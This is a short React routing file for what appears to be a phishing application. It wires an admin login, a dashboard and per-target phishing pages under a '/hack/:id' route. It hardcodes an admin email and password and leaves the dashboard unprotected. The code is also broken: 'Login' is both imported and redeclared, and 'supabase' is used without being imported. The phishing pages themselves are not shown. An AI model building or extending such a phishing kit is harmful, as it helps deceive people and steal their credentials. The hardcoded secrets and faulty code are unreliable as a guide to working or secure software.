import { BrowserRouter, Routes, Route } from 'react-router-dom';
import Dashboard from './pages/Dashboard';
import PhishingPage from './pages/PhishingPage';
import Login from './pages/Login'; // Create this simple auth page using Supabase Auth UI or form

// Simple Auth Page Placeholder
const Login = () => {
  const handleLogin = async () => {
    const { data, error } = await supabase.auth.signInWithPassword({
      email: 'admin@phishing.com', // Use your actual admin email
      password: 'password123'
    });
    if(error) alert(error.message);
  };

  return (
    <div className="h-screen flex items-center justify-center bg-gray-900">
      <button onClick={handleLogin} className="px-6 py-3 bg-green-500 rounded text-white font-bold">
        Admin Login
      </button>
    </div>
  );
};

function App() {
  return (
    <BrowserRouter>
      <Routes>
        <Route path="/" element={<Login />} /> 
        {/* Note: In a real app, protect /dashboard with auth check */}
        <Route path="/dashboard" element={<Dashboard />} />
        <Route path="/hack/:id" element={<PhishingPage />} />
      </Routes>
    </BrowserRouter>
  );
}

export default App;